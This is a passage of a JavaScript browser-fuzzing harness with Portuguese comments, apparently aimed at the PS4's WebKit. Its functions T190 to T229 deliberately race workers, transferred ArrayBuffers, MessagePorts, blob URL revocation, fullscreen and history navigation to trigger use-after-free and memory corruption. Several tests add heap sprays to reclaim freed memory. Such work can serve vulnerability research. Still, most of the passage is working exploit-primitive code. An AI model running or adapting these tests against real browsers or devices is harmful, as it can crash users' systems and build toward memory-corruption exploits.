        // 3. Modifica vídeo
        v.src = "foo.mp4";
        
        // 4. Navega e volta rapidamente (History thrashing)
        history.back();
        history.forward();
        
        // 5. Sai do FS no meio da navegação
        exitFS();
        
        // 6. Destrói vídeo
        document.body.removeChild(v);
        
        var fill = new Array(1000).fill("MEMORY");
        log(">> T190: The Combo executed.");
    }, 500);
}
function runTest191() {
    log("Iniciando T191: Worker Message Loopback UAF...");
    // Cria um worker que apenas ecoa a mensagem recebida
    var b = new Blob(["self.onmessage=function(e){postMessage(e.data);}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    var mc = new MessageChannel();
    
    // Envia a porta 1 para o worker, que a devolve
    w.postMessage("init", [mc.port1]);
    
    w.onmessage = function(e) {
        // Quando a porta volta, tentamos usá-la imediatamente
        // enquanto fechamos a outra ponta (port2)
        try {
            var p = e.data; // Se for objeto transferido
            if(p && p.postMessage) {
                p.postMessage("crash");
                mc.port2.close(); // Fecha o par enquanto o kernel processa a msg
            }
        } catch(z) {}
    };
    
    // Dispara ciclo rápido
    var t = setInterval(function() {
        w.postMessage("ping");
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T191: IPC loop race stop.");
    }, 3000);
}

function runTest192() {
    log("Iniciando T192: TypedArray Transfer Neuter Race...");
    var ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    
    var b = new Blob(["self.onmessage=function(e){var v=new Uint8Array(e.data); self.close();}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Tenta acessar o array logo após transferir a propriedade (neutering)
        // Race condition: O JS engine pode permitir acesso antes da flag de neuter ser setada
        w.postMessage(ab, [ab]);
        
        // Acesso ilegal pós-transferência
        var check = view[0];
        log("!! T192: Accessed neutered buffer: " + check);
    } catch(e) {
        log(">> T192 Blocked (Correct behavior): " + e.message);
    }
    
    // Tenta realocar na mesma região
    var ab2 = new ArrayBuffer(1024 * 1024 * 10);
}

function runTest193() {
    log("Iniciando T193: Shared Blob URL Thread Kill...");
    var data = new Uint8Array(1024*1024).fill(0xCC);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var workers = [];
    var code = "self.onmessage=function(e){ var x = new XMLHttpRequest(); x.open('GET', e.data, false); x.send(); }";
    var wb = new Blob([code], {type:'js'});
    
    for(var i=0; i<10; i++) {
        var w = new Worker(URL.createObjectURL(wb));
        w.postMessage(url); // Todos tentam ler o mesmo Blob URL
        workers.push(w);
    }
    
    setTimeout(function() {
        // Revoga a URL enquanto 10 threads tentam ler
        URL.revokeObjectURL(url);
        // Mata os workers abruptamente
        workers.forEach(w => w.terminate());
        log(">> T193: Blob URL race executed.");
    }, 100);
}

function runTest194() {
    log("Iniciando T194: Worker Garbage Storm PostMessage...");
    var code = `
        self.onmessage = function(e) {
            // Cria lixo massivo ao receber msg
            var junk = [];
            for(var i=0; i<10000; i++) junk.push({a: i, b: new Uint8Array(100)});
            postMessage("done");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    var ab = new ArrayBuffer(1024 * 1024); // 1MB payload
    
    var t = setInterval(function() {
        // Envia buffers rapidamente para encher a fila de mensagens do worker
        // O Worker está ocupado com GC, fila cresce no Kernel
        w.postMessage(ab); // Clone, não transfer
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T194: GC Storm finished.");
    }, 3000);
}

function runTest195() {
    log("Iniciando T195: Message Port Clone Death...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    try {
        // Tenta clonar a porta recursivamente via postMessage estruturado
        var deep = [];
        for(var i=0; i<100; i++) deep.push(p1);
        
        window.postMessage(deep, "*", deep); // Transfere a mesma porta múltiplas vezes?
        
        log(">> T195: Multi-transfer attempted.");
    } catch(e) {
        log(">> T195 Logic Error: " + e.message);
    }
}

function runTest196() {
    log("Iniciando T196: Fullscreen History Back Flood...");
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    reqFS(el);
    
    // Enche o histórico
    for(var i=0; i<50; i++) history.pushState({i:i}, "s"+i, "/"+i);
    
    var t = setInterval(function() {
        // Volta no histórico rapidamente enquanto em FS
        // Cada 'back' tenta restaurar o scroll e estado da página
        history.back();
        
        // Tenta manipular o elemento FS durante a navegação
        el.style.display = (el.style.display == "none") ? "block" : "none";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        log(">> T196: History nav while FS done.");
    }, 3000);
}

function runTest197() {
    log("Iniciando T197: Video Fullscreen Detach Panic...");
    var v = document.createElement('video');
    v.src = "blob:null/void"; // Fonte inválida
    document.body.appendChild(v);
    
    reqFS(v);
    
    setTimeout(function() {
        // Remove vídeo do DOM
        document.body.removeChild(v);
        // Tenta acionar play em elemento desconectado e em FS
        try { v.play(); } catch(e){}
        // Sai do FS (Kernel tenta restaurar janela do elemento nulo)
        exitFS();
        
        // Aloca textura para sobrescrever framebuffer
        var c = document.createElement('canvas');
        c.width=1920; c.height=1080;
        c.getContext('2d').fillRect(0,0,1,1);
        
        log(">> T197: Video detach sequence run.");
    }, 500);
}

function runTest198() {
    log("Iniciando T198: Canvas Context Loss FS Toggle...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    var state = false;
    var t = setInterval(function() {
        // Desenha
        ctx.fillStyle = "blue";
        ctx.fillRect(0,0,1000,1000);
        
        // Toggle FS
        if(!state) { reqFS(c); state=true; }
        else { exitFS(); state=false; }
        
        // Força perda de contexto simulada redimensionando para zero
        c.width = 0;
        c.width = 1000;
        
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T198: Canvas context thrashing.");
    }, 3000);
}

function runTest199() {
    log("Iniciando T199: Audio Context Visualizer Crash...");
    if(!window.AudioContext && !window.webkitAudioContext) return;
    var ac = new (window.AudioContext || window.webkitAudioContext)();
    
    var osc = ac.createOscillator();
    var ana = ac.createAnalyser();
    osc.connect(ana);
    osc.start();
    
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    reqFS(c);
    
    var data = new Uint8Array(ana.frequencyBinCount);
    var running = true;
    
    function draw() {
        if(!running) return;
        ana.getByteFrequencyData(data);
        // Loop de renderização pesado
        var ctx = c.getContext('2d');
        ctx.fillRect(0,0,100,100);
        requestAnimationFrame(draw);
        
        // Tenta fechar o contexto de áudio enquanto renderiza em FS
        if(Math.random() > 0.98) {
            ac.close().then(() => { ac = new (window.AudioContext || window.webkitAudioContext)(); });
        }
    }
    draw();
    
    setTimeout(function() {
        running = false;
        exitFS();
        osc.stop();
        document.body.removeChild(c);
        log(">> T199: Audio visualizer stress.");
    }, 3000);
}

function runTest200() {
    log("Iniciando T200: THE VOID (STATE DESYNC)...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var w = f.contentWindow;
        var d = f.contentDocument;
        var div = d.createElement('div');
        div.style.background = "black";
        d.body.appendChild(div);
        
        // 1. Pede FS dentro do Iframe
        if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
        
        setTimeout(function() {
            // 2. Main thread navega o iframe para longe
            f.src = "about:blank";
            
            // 3. Push state no top frame simultaneamente
            history.pushState(null, null, "/void");
            
            // 4. Cria Worker para comer CPU
            var blob = new Blob(["while(1);"], {type:'js'});
            var worker = new Worker(URL.createObjectURL(blob));
            
            // 5. Destrói o iframe
            setTimeout(() => {
                document.body.removeChild(f);
                worker.terminate();
                log(">> T200: Desync sequence complete.");
            }, 500);
        }, 200);
    };
    f.src = "about:blank";
}
function runTest201() {
    log("Iniciando T201: Worker Terminate Buffer UAF...");
    var ab = new ArrayBuffer(1024 * 1024 * 2);
    var view = new Uint8Array(ab);
    view[0] = 0xFF;
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; while(1);}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        
        // Race: Transfere ownership, depois mata o worker, depois tenta ler via view antiga
        // Se o cleanup do worker falhar em invalidar a view na main thread instantaneamente
        w.postMessage(ab, [ab]);
        w.terminate();
        
        try {
            if(view.byteLength > 0) {
                var leak = view[0]; 
            }
        } catch(e) {}
        
        ab = new ArrayBuffer(1024 * 1024 * 2);
        view = new Uint8Array(ab);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T201: Terminate race finished.");
    }, 3000);
}

function runTest202() {
    log("Iniciando T202: Nested Worker Transfer Chain...");
    var codeInner = "self.onmessage=function(e){postMessage(e.data,[e.data]);}";
    var blobInner = new Blob([codeInner], {type:'js'});
    var urlInner = URL.createObjectURL(blobInner);
    
    var codeOuter = `var w=new Worker('${urlInner}'); self.onmessage=function(e){w.postMessage(e.data,[e.data]);}`;
    var blobOuter = new Blob([codeOuter], {type:'js'});
    
    var w = new Worker(URL.createObjectURL(blobOuter));
    var ab = new Uint8Array(1024 * 512);
    
    var t = setInterval(function() {
        try {
            // Cria buffer, transfere para Pai -> Filho -> Pai
            var buf = new ArrayBuffer(1024);
            w.postMessage(buf, [buf]);
        } catch(e) {}
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T202: Transfer chain stress done.");
    }, 3000);
}

function runTest203() {
    log("Iniciando T203: Shared Blob URL Revoke Storm...");
    var data = new Uint8Array(1024 * 64).fill(0x41);
    var b = new Blob([data]);
    var url = URL.createObjectURL(b);
    var workers = [];
    
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); x.send();}";
    var wb = new Blob([code], {type:'js'});
    
    for(var i=0; i<16; i++) {
        var w = new Worker(URL.createObjectURL(wb));
        workers.push(w);
    }
    
    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(url));
        
        // Revoga e recria rapidamente para causar race no File System do Kernel
        URL.revokeObjectURL(url);
        url = URL.createObjectURL(new Blob([data]));
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T203: Blob FS race stopped.");
    }, 3000);
}

function runTest204() {
    log("Iniciando T204: Message Port Double Transfer...");
    var mc = new MessageChannel();
    var p = mc.port1;
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        // Tenta transferir a MESMA porta em dois índices do array de transferência
        // Isso explora como o WebKit serializa os descritores
        w.postMessage("crash", [p, p]);
        log(">> T204: Double transfer sent.");
    } catch(e) {
        log(">> T204 Blocked: " + e.message);
        // Fallback: Transferir e fechar imediatamente
        try {
            var mc2 = new MessageChannel();
            w.postMessage("race", [mc2.port1]);
            mc2.port1.close();
        } catch(z) {}
    }
}

function runTest205() {
    log("Iniciando T205: Worker GC Flood Gate...");
    var code = `
        var storage = [];
        self.onmessage = function(e) {
            // Aloca memória para forçar GC
            for(var i=0; i<1000; i++) storage.push({a:1, b:new ArrayBuffer(100)});
            if(storage.length > 5000) storage = [];
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia buffers transferíveis rapidamente para encher a queue IPC
        var buf = new ArrayBuffer(0x1000);
        w.postMessage(buf, [buf]);
    }, 1);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T205: IPC/GC flood finished.");
    }, 3000);
}

function runTest206() {
    log("Iniciando T206: Fullscreen History Back Flip...");
    var el = document.createElement('div');
    el.style.backgroundColor = "blue";
    document.body.appendChild(el);
    
    reqFS(el);
    
    // Cria histórico
    history.pushState({p:1}, "1", "/1");
    history.pushState({p:2}, "2", "/2");
    
    var t = setInterval(function() {
        // Navegação força rebuild do documento/estado
        history.back();
        
        // Tenta re-pedir fullscreen durante a transição de navegação
        if(document.webkitFullscreenElement) exitFS();
        else reqFS(el);
        
        history.forward();
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        log(">> T206: Navigation state flip done.");
    }, 3000);
}

function runTest207() {
    log("Iniciando T207: Video Detach Fullscreen Zombie...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        // Remove vídeo do DOM enquanto está em FS
        document.body.removeChild(v);
        
        // Tenta manipular propriedades que afetam o overlay
        v.controls = true;
        v.poster = "http://localhost/404";
        
        // Força exitFS global, o kernel deve limpar a superfície órfã
        exitFS();
        
        // Heap spray para preencher estruturas liberadas
        var spray = new Uint32Array(0x4000).fill(0xDEADBEEF);
        log(">> T207: Video detach race executed.");
    }, 500);
}

function runTest208() {
    log("Iniciando T208: Canvas Context Loss FS Resize...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Resize destrutivo
        c.width = (c.width === 10) ? 1920 : 10;
        
        // Desenho pesado
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1920,1080);
        
        // Tenta perder contexto via extensão se disponível
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T208: GPU context toggle done.");
    }, 3000);
}

function runTest209() {
    log("Iniciando T209: History State Getter Poison...");
    var state = {};
    Object.defineProperty(state, 'poison', {
        get: function() {
            // Getter malicioso executado durante serialização
            history.replaceState(null, null, null); // Modifica histórico durante save
            var junk = new Array(1000).fill(1); // GC Pressure
            return "kboom";
        }
    });
    
    try {
        history.pushState(state, "Title", "/poison");
        log(">> T209: State push attempted.");
    } catch(e) {
        log(">> T209 Serialization: " + e.message);
    }
}

function runTest210() {
    log("Iniciando T210: Iframe Nav Fullscreen Lock...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var div = d.createElement('div');
        div.style.background = "red";
        d.body.appendChild(div);
        
        // Pede FS no iframe
        if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Navega o iframe (destrói documento)
            f.src = "about:blank";
            
            // Tenta sair do FS do contexto pai
            exitFS();
            
            // Tenta acessar o elemento antigo
            div.innerHTML = "UAF?";
        }, 200);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T210: Iframe FS navigation done.");
    }, 2000);
}
function runTest211() {
    log("Iniciando T211: Worker Neutered Buffer Access...");
    var ab = new ArrayBuffer(1024 * 1024 * 8);
    var u8 = new Uint8Array(ab);
    u8[0] = 1;
    
    var b = new Blob(["onmessage=function(e){var d=e.data; postMessage('ack');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Transfere o buffer para o worker (neutering no main thread)
        w.postMessage(ab, [ab]);
        
        // Race: Tenta acessar o buffer imediatamente após o envio
        // Se a implementação de neutering não for atômica/imediata, isso pode ler memória inválida ou antiga
        var val = u8[0];
        
        // Tenta re-transferir um buffer já neuterizado (deve falhar, mas testamos o tratamento de erro)
        w.postMessage(ab, [ab]);
        
        log("!! T211: Accessed/Used neutered buffer: " + val);
    } catch(e) {
        log(">> T211 Exception (Expected): " + e.message);
    }
    w.terminate();
}

function runTest212() {
    log("Iniciando T212: Message Port Entanglement Kill...");
    var ch1 = new MessageChannel();
    var ch2 = new MessageChannel();
    
    var b = new Blob(["onmessage=function(e){var p=e.data; p.postMessage('ping');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    // Entrelaça as portas enviando uma através da outra para o worker
    // ch1.port1 -> Worker. Worker usa para enviar msg.
    w.postMessage(ch1.port2, [ch1.port2]);
    
    var t = setInterval(function() {
        try {
            // Envia a porta do canal 2 através do canal 1 (que está no worker)
            ch1.port1.postMessage(ch2.port2, [ch2.port2]);
            
            // Imediatamente fecha o canal 1 localmente
            ch1.port1.close();
            
            // Tenta usar a porta que acabou de ser fechada/transferida
            ch1.port1.onmessage = function() {};
            
            // Reseta para o próximo ciclo
            ch1 = new MessageChannel();
            ch2 = new MessageChannel();
            w.postMessage(ch1.port2, [ch1.port2]);
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T212: Port entanglement stop.");
    }, 3000);
}

function runTest213() {
    log("Iniciando T213: Worker Self-Close PostMessage Flood...");
    var code = `
        self.onmessage = function(e) {
            for(var i=0; i<1000; i++) postMessage(new Uint8Array(1024).fill(i));
            self.close(); // Fecha a thread
            // Tenta enviar mais mensagens após fechar
            for(var i=0; i<1000; i++) postMessage(new Uint8Array(1024).fill(0xCC));
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var count = 0;
    w.onmessage = function(e) { count++; };
    
    w.postMessage("start");
    
    // Main thread bombardeia worker moribundo
    var t = setInterval(function() {
        w.postMessage("spam");
    }, 1);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T213: Dead worker flood count: " + count);
    }, 3000);
}

function runTest214() {
    log("Iniciando T214: Shared Array Buffer Atomic Wait (Sim)...");
    // PS4 não tem SharedArrayBuffer real, mas simulamos a lógica de race com TypedArrays e Workers
    var sab = new ArrayBuffer(1024);
    var i32 = new Int32Array(sab);
    
    var b = new Blob(["self.onmessage=function(e){var d=new Int32Array(e.data); d[0]=1;}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        // Transfere buffer
        w.postMessage(sab, [sab]);
        
        // Tenta recriar a view imediatamente
        // Em implementações com falha de referência, isso pode apontar para o buffer antigo
        try {
            i32 = new Int32Array(sab); 
            if(i32.length > 0) log("!! T214: Ghost reference found");
        } catch(e) {}
        
        sab = new ArrayBuffer(1024);
        i32 = new Int32Array(sab);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T214: Buffer atomic race stop.");
    }, 3000);
}

function runTest215() {
    log("Iniciando T215: Blob URL Worker Revocation Race...");
    var data = new Uint8Array(1024*1024).fill(0x90);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){ var r = new FileReaderSync(); try{r.readAsArrayBuffer(new Blob([u]));}catch(e){}}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        w.postMessage(url);
        // Revoga URL imediatamente
        URL.revokeObjectURL(url);
        // Cria nova
        url = URL.createObjectURL(new Blob([data]));
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T215: URL revocation race done.");
    }, 3000);
}

function runTest216() {
    log("Iniciando T216: Fullscreen Iframe History Nav...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var el = d.createElement('div');
        el.style.background = "purple";
        d.body.appendChild(el);
        
        // Pede FS dentro do Iframe
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Push state no Iframe
            f.contentWindow.history.pushState({x:1}, "t", "/fs");
            
            // Navega Iframe (recarrega)
            f.src = f.src + "?reload";
            
            // Main thread tenta modificar o histórico global simultaneamente
            history.replaceState(null, null, "/main_crash");
        }, 200);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T216: FS Iframe Nav sequence.");
    }, 3000);
}

function runTest217() {
    log("Iniciando T217: Video FS Track Switch Crash...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t1 = v.addTextTrack("subtitles", "Eng", "en");
    var t2 = v.addTextTrack("subtitles", "Por", "pt");
    
    var t = setInterval(function() {
        // Troca faixas de legenda rapidamente em FS
        // Isso força o renderizador de overlay a destruir/recriar texturas
        t1.mode = (t1.mode === "showing") ? "hidden" : "showing";
        t2.mode = (t2.mode === "showing") ? "hidden" : "showing";
        
        // Adiciona Cues dinamicamente durante a troca
        if(t1.mode === "showing") t1.addCue(new VTTCue(0, 10, "A".repeat(100)));
        
        // Força resize do vídeo
        v.width = (Math.random() > 0.5) ? 100 : 200;
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T217: Track switching stress done.");
    }, 3000);
}

function runTest218() {
    log("Iniciando T218: Canvas FS Context Loss Loop...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1000,1000);
        
        // Simula perda de contexto via extensão ou sobrecarga
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
        // Tenta restaurar e desenhar imediatamente
        if(ext) ext.restoreContext();
        
        // Tenta ler pixels durante o estado perdido
        try { ctx.getImageData(0,0,1,1); } catch(e){}
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T218: Context loss loop done.");
    }, 3000);
}

function runTest219() {
    log("Iniciando T219: History State GC Pressure Cooker...");
    // Cria objetos grandes com referências circulares
    function makeBomb() {
        var a = { buffer: new ArrayBuffer(1024 * 1024) };
        var b = { ref: a };
        a.self = a;
        return a;
    }
    
    var t = setInterval(function() {
        try {
            // Push state com objeto complexo
            history.pushState(makeBomb(), "bomb", "/bomb");
            
            // Navega para forçar serialização/armazenamento
            history.forward();
            history.back();
            
            // Replace state com null para forçar GC do objeto anterior
            history.replaceState(null, "null", "/clean");
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T219: State serialization stress stop.");
    }, 3000);
}

function runTest220() {
    log("Iniciando T220: THE CLUSTER BOMB (ALL VECTORS)...");
    
    // 1. Worker Thread
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){while(1);}"], {type:'js'})));
    w.postMessage("hang");
    
    // 2. Fullscreen toggle
    var el = document.createElement('div');
    el.style.background = "orange";
    document.body.appendChild(el);
    var fsInt = setInterval(() => {
        if(document.webkitFullscreenElement) exitFS();
        else reqFS(el);
    }, 200);
    
    // 3. History Thrashing
    var hInt = setInterval(() => {
        try { history.pushState({}, "t", "/"+Math.random()); } catch(e){}
    }, 100);
    
    // 4. Memory Pressure
    var arr = [];
    var memInt = setInterval(() => {
        arr.push(new ArrayBuffer(1024*1024));
        if(arr.length > 50) arr = [];
    }, 50);
    
    setTimeout(function() {
        clearInterval(fsInt);
        clearInterval(hInt);
        clearInterval(memInt);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T220: Cluster bomb defused.");
    }, 5000);
}
function runTest221() {
    log("Iniciando T221: Message Port Transfer Zombie...");
    var mc = new MessageChannel();
    var port = mc.port1;
    
    var b = new Blob(["self.onmessage=function(e){var p=e.data; setInterval(() => {try{p.postMessage('ping');}catch(e){}}, 1);}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        try {
            // Transfere a porta para o worker
            w.postMessage(port, [port]);
            
            // Imediatamente tenta fechar a outra ponta
            mc.port2.close();
            
            // Recria o canal rapidamente
            mc = new MessageChannel();
            port = mc.port1;
            
            // Tenta terminar o worker enquanto ele usa a porta
            if(Math.random() > 0.9) {
                w.terminate();
                w = new Worker(URL.createObjectURL(b));
            }
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T221: Port zombie race stopped.");
    }, 3000);
}

function runTest222() {
    log("Iniciando T222: Worker Terminate Buffer Reclaim...");
    var ab = new ArrayBuffer(1024 * 1024 * 4); // 4MB
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; while(true) { var x = new Uint8Array(d); x[0]=1; }}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        // Transfere buffer para worker
        try { w.postMessage(ab, [ab]); } catch(e){}
        
        // Mata worker no meio da operação de escrita
        w.terminate();
        
        // Tenta alocar imediatamente para ocupar o mesmo espaço de memória física
        var reclaim = new ArrayBuffer(1024 * 1024 * 4);
        var view = new Uint8Array(reclaim);
        if(view[0] !== 0) log("!! T222: Memory corruption detected!");
        
        // Reinicia
        w = new Worker(URL.createObjectURL(b));
        ab = new ArrayBuffer(1024 * 1024 * 4);
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T222: Buffer race finished.");
    }, 3000);
}

function runTest223() {
    log("Iniciando T223: Recursive postMessage Flood Loop...");
    var code = `
        self.onmessage = function(e) {
            // Worker envia mensagem para si mesmo e para main thread
            // Criando uma explosão exponencial de mensagens
            postMessage("flood");
            var ch = new MessageChannel();
            ch.port1.onmessage = self.onmessage;
            ch.port2.postMessage("internal");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    w.onmessage = function() {
        // Main thread responde com objetos pesados
        var junk = {data: new Array(1000).fill("X")};
        w.postMessage(junk);
    };
    
    w.postMessage("start");
    
    setTimeout(function() {
        w.terminate();
        log(">> T223: IPC Recursive flood stop.");
    }, 3000);
}

function runTest224() {
    log("Iniciando T224: Shared Blob URL Thread Collision...");
    var data = new Uint8Array(1024 * 512).fill(0xAA);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){ var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); }";
    var wb = new Blob([code], {type:'js'});
    
    var workers = [];
    for(var i=0; i<8; i++) workers.push(new Worker(URL.createObjectURL(wb)));
    
    var t = setInterval(function() {
        // Todas threads leem a mesma URL
        workers.forEach(w => w.postMessage(url));
        
        // Main thread revoga e recria, alterando o backing store
        URL.revokeObjectURL(url);
        data[0] = Math.random() * 255; // Muda dados
        blob = new Blob([data]);
        url = URL.createObjectURL(blob);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T224: Blob concurrency test done.");
    }, 3000);
}

function runTest225() {
    log("Iniciando T225: Worker Import Script GC Race...");
    var script = URL.createObjectURL(new Blob(["gc();"], {type:'js'}));
    var code = `
        self.onmessage = function(u) {
            try {
                // Importa script que força GC (se disponível) ou aloca memória
                importScripts(u);
                var arr = [];
                for(var i=0; i<10000; i++) arr.push({x:1});
            } catch(e){}
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        w.postMessage(script);
        // Spamma mensagens para interromper o import
        var buf = new ArrayBuffer(1000);
        w.postMessage(buf, [buf]);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T225: ImportScripts stress done.");
    }, 3000);
}

function runTest226() {
    log("Iniciando T226: Iframe Fullscreen Detach Bomb...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        container.appendChild(f);
        
        f.onload = function() {
            var el = f.contentDocument.createElement('div');
            el.style.background = "red";
            f.contentDocument.body.appendChild(el);
            
            // Pede FS
            if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            
            // Remove o iframe imediatamente após o pedido, antes da animação completar
            setTimeout(() => {
                if(container.contains(f)) container.removeChild(f);
                // Força exitFS global para confundir o compositor
                exitFS();
            }, 10);
        };
        
        if(container.childNodes.length > 10) container.innerHTML = "";
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        if(document.body.contains(container)) document.body.removeChild(container);
        log(">> T226: Iframe FS detach sequence.");
    }, 3000);
}

function runTest227() {
    log("Iniciando T227: History State Serialization Trap...");
    var bomb = {
        get data() {
            // Getter invocado durante serialização do History
            // Aloca memória massiva e tenta navegar para longe
            var arr = new Array(10000).fill("Z");
            history.replaceState(null, null, "/trap");
            return arr;
        }
    };
    
    var t = setInterval(function() {
        try {
            history.pushState(bomb, "Bomb", "/bomb");
        } catch(e) {}
        
        // Navegação rápida para forçar escrita do estado no disco/memória
        history.back();
        history.forward();
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T227: Serialization trap finished.");
    }, 3000);
}

function runTest228() {
    log("Iniciando T228: Video Source Swap FS Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var sources = ["a.mp4", "b.webm", "c.ogv", null, ""];
    
    var t = setInterval(function() {
        // Troca fonte rapidamente enquanto em FS
        // Kernel tenta decodificar header, falha, tenta próximo
        v.src = sources[Math.floor(Math.random() * sources.length)];
        v.load();
        
        // Tenta redimensionar o elemento de vídeo (overlay surface)
        v.style.width = (Math.random() * 100) + "%";
        v.style.height = (Math.random() * 100) + "%";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T228: Video surface thrashing done.");
    }, 3000);
}

function runTest229() {
    log("Iniciando T229: Canvas Proxy Context Loss...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    // Proxy intercepta chamadas de desenho
    var pCtx = new Proxy(ctx, {
        get: function(target, prop) {
            if(prop === 'fillRect') {
                // Causa perda de contexto simulada no meio do desenho
                c.width = 0; 
                c.width = 1000;
            }
            return target[prop];
        }
    });
    
    reqFS(c);
    
    var t = setInterval(function() {
        try {
            pCtx.fillStyle = "blue";
            pCtx.fillRect(0,0,1000,1000);
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T229: Proxy context loss done.");
    }, 3000);
}

function runTest230() {
